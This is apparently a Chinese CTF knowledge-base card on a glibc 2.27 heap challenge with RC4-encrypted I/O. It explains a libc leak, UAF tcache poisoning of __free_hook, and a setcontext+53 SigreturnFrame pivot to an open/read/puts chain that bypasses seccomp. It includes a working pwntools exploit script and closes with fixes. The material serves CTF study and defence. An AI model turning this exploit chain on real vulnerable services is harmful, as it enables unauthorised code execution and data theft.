---
id: binary-pwn-heap-rc4-encrypted-io-uaf-freehook-setcontext-orw
title: 全交互数据被 RC4 加密的堆题：客户端先实现同一 KSA/PRGA 才能泄 libc，再用 UAF 把 free_hook 改成 setcontext+53 迁栈执行 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: rc4-encrypted-io-uaf-freehook-setcontext-orw
tags:
- pwn
- heap
- uaf
- rc4
- free-hook
- setcontext
- stack-pivot
- orw
- seccomp
- tcache
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:56:26+08:00'
  notes: 已对照原文核对；本次核对未读取图片；RC4 KSA/PRGA 解密函数、key=s4cur1ty_p4ssw0rd、8 个 0x100 块 + 1 个 0x270 块、show 读 unsorted bin 后减 0x3ebca0、delete 不置空形成 UAF、edit(6) 投毒 __free_hook 后两次 add 写入 setcontext+53、SigreturnFrame 的 rsp/rip/rdi/rsi 与 push rcx 写坏 rsp-8 所以 flag 不能放栈起始、./flag 位于 orw_addr+0x50，均与正文与 exp 一致；原文 exp 只 delete(0..7) 未显式 delete(8)，卡内原理段「并全部释放」表述偏松，已按 exp 顺序列为 delete(0..7)
url: /docs/binary/pwn/heap/binary-pwn-heap-rc4-encrypted-io-uaf-freehook-setcontext-orw/
draft: false
kb_aliases:
- RC4 加密堆题
- 输入输出都加密的 pwn
- free_hook setcontext+53
- SigreturnFrame ORW
- seccomp 下读 flag
- 客户端复现 RC4
---

## 一句话结论

当程序对 `add/show/delete/edit` 的**输入与输出全部做 RC4 加密**时，pwn 的第一步不是找洞，而是在 exp 里照抄一遍 `KSA/PRGA` 让所有 payload 与泄漏值先过一遍 `rc4_decrypt`（RC4 自反，加解密同函数）；能正常通信后，本题就是「7 块填满 tcache + 一块进 unsorted bin 泄 libc」+「delete 不置空的 UAF」+「把 `__free_hook` 写成 `setcontext+53`、用 `SigreturnFrame` 迁栈执行 open/read/puts 的 ORW」，以绕开 seccomp 只允许的少数系统调用。

## 原理

- **加密 I/O 只是传输层，不改变漏洞**：`add` 把用户输入加密后存进堆、`show` 把堆内容加密后打印、`edit/delete` 同样处理。服务端只认密文，所以每个 `sendafter` 的参数、以及每个 `recvuntil` 得到的泄漏值都必须过 RC4；密钥硬编码在二进制里（本例 `s4cur1ty_p4ssw0rd`），静态分析即可取出。
- **RC4 自反**：`c = p ^ keystream`，同一个 `rc4_decrypt(key, data)` 既能加密也能解密，因此 exp 里一个函数就够；但注意它按**字节**运算，泄漏地址是 6～7 个非打印字节，必须用 `latin-1`/bytes 处理，不能当字符串。
- **泄 libc**：申请 7～8 个 `0x100` 块把对应尺寸的 tcache 填满，再申请一个更大的块（本例 `0x270`）并全部释放，使其中一块落入 unsorted bin，`show` 该块读出 `main_arena` 指针；把密文 RC4 解密后取前 6～7 字节，减 `0x3ebca0`（glibc 2.27）得 libc 基址。
- **UAF 投毒**：`delete` 只 `free` 不清索引，于是仍可用 `edit` 改写已释放块的 `fd`；把它指向 `__free_hook`，连续两次 `add` 同尺寸块，第二次就返回 `__free_hook` 地址，写入 `setcontext+53`。
- **为什么用 setcontext+53 而不是 system**：题目开了 seccomp（禁 `execve`），拿 shell 无意义；`setcontext+53` 处 `mov rsp, [rdi+0xa0]` 等一串 `mov` + `ret`，可以把 `rdi` 指向的 `SigreturnFrame` 里的 `rsp/rip/rdi/rsi…` 全部装载进寄存器并从 `rip` 继续执行，等于一次受控的「迁栈 + 设参」。
- **ORW 细节**：`frame.rip = open`、`frame.rdi = orw_addr+0x50`（指向 `./flag`）、`frame.rsi = 0`；`orw` 段依次 `pop rdi;3` → `read(3, buf, 0x100)` → `puts(buf)`。注意 `push rcx` 会把 `rsp-8` 写坏，所以 flag 字符串不能放在迁移后栈的起始位置，要往后挪。
- **触发方式**：最后 `delete` 一个装 `SigreturnFrame` 的块，`__free_hook(ptr)` 被调用 → `setcontext+53(ptr)` → `rsp = frame.rsp` → 执行 ORW。

## 触发条件

- glibc 保留 `__free_hook`（≤2.33，本例 2.27）且存在 `setcontext` 可用偏移。
- 二进制里有 seccomp 禁止 `execve`（否则直接 `free_hook = system` 更快）。
- `delete` 后索引不清空（UAF）或 `edit` 能作用于已释放块。
- 程序对 I/O 的加密密钥硬编码、算法为 RC4 或其它可逆流密码，且能从反编译中完整还原（含 key 长度取模细节）。
- 有 `show` 能打印未初始化/已释放块内容以泄 libc。

## 利用步骤

1. 反编译拿到 key 与 KSA/PRGA 细节，在 exp 里实现 `rc4_decrypt(key, data)`，先用明文/密文对验证一轮。
2. 把所有交互（菜单选择、index、size、content）都套上加密；`recv` 到的数据先解密再解析。
3. 布局：`add(i, 0x100)` 八次 + `add(8, 0x270)` 一次，然后 `delete(0..7)`，`show(7)` 读 unsorted bin 指针 → `libc.address = leak - 0x3ebca0`。
4. `show(2)`（或其它仍可读的块）读出 heap 地址，得到可写的 `orw_addr`。
5. 用 `SigreturnFrame` 构造 ORW：`frame.rsp = orw_addr`、`frame.rip = open`、`frame.rdi = orw_addr+0x50`、`frame.rsi = 0`；再把 `open/read/puts` 的 ROP 链与 `./flag` 按顺序拼在 `orw_addr` 之后。
6. UAF 投毒：`edit(6, p64(__free_hook))`，两次 `add(1, 0x100)` 中第二次写入 `p64(setcontext+53)`。
7. 把 ORW 链写进一个堆块、把 `str(frame)` 写进另一个堆块，`delete` 后者触发。

## PoC

```python
from pwn import *
key = b's4cur1ty_p4ssw0rd'

def ksa(k):
    s = list(range(256)); j = 0
    for i in range(256):
        j = (j + s[i] + k[i % len(k)]) % 256
        s[i], s[j] = s[j], s[i]
    return s

def prga(s, n):
    i = j = 0; out = bytearray()
    for _ in range(n):
        i = (i + 1) % 256; j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(s[(s[i] + s[j]) % 256])
    return bytes(out)

def rc4(data):                      # 自反：加密=解密
    return bytes(a ^ b for a, b in zip(data, prga(ksa(key), len(data))))

# —— 泄 libc ——
for i in range(8): add(i, 0x100, rc4(b'Halo'))
add(8, 0x270, rc4(b'Halo2'))
for i in range(8): delete(i)
show(7)
ru(b'[7,')
libc.address = u64(rc4(ru(b']')[:-1])[:6].ljust(8, b'\x00')) - 0x3ebca0

# —— free_hook -> setcontext+53，迁栈执行 ORW ——
orw_addr = heap + 0x2170
frame = SigreturnFrame()
frame.rsp, frame.rip, frame.rdi, frame.rsi = orw_addr, libc.sym['open'], orw_addr + 0x50, 0
orw  = p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(orw_addr + 0x100)
orw += p64(pop_rdx) + p64(0x100) + p64(libc.sym['read'])
orw += p64(pop_rdi) + p64(orw_addr + 0x100) + p64(libc.sym['puts']) + b'./flag\x00\x00'

add(10, 0x150, rc4(b'aaa'))
edit(6, rc4(p64(libc.sym['__free_hook'])))
add(1, 0x100, rc4(b'aaa'))
add(1, 0x100, rc4(p64(libc.sym['setcontext'] + 53)))
edit(10, rc4(orw))
edit(8, rc4(bytes(frame)))
delete(8)                            # free(frame) -> setcontext+53 -> ORW
```

## 变体与关联

- 变体：加密换成 AES-CBC（需处理 IV 与分块）或按块异或；密钥可由 `GetTickCount`/时间派生，此时要动态抓 key。
- 变体：`free_hook` 打 `system` 拿 shell（无 seccomp 时最简）；或打 `__malloc_hook` + one_gadget。
- 变体：无 `setcontext` 可用时改用 `_IO_str_overflow` / `_IO_wfile_jumps` 的 House of Apple 迁栈。
- 关联：[[binary-pwn-heap-latest-chunk-only-tcache-perthread-setcontext-orw]]（同样 `free_hook→setcontext+53` 的 ORW，但原语是劫持 `tcache_perthread_struct`）、[[binary-pwn-format-string-rc4-decrypted-message-freehook-system]]（同为 RC4 传输层，但那里是格式化字符串题）、[[binary-pwn-heap-offbyone-show-codebase-stdout-leak-freehook-mprotect-orw]]（ORW 的另一种落地）。
- 边界：若加密用了带随机 IV 的分组模式且 IV 不随包发送，客户端无法预构造密文，本路线失效；`delete` 若置空索引则需另找 UAF/溢出。

## 检测与防御

- 检测（CTF/审计）：`delete` 后索引未置空；`show` 可打印已释放块；`edit` 长度不受限；`__free_hook` 未被保护。
- 修复：`free` 后置空指针与索引；`show/edit` 校验索引有效性与块大小；升级 glibc ≥2.34（移除 hook）并开启 safe-linking。
- 加固：Full RELRO + PIE + 开启 seccomp 的同时去掉一切 hook 可写面；对堆块加 cookie 校验。
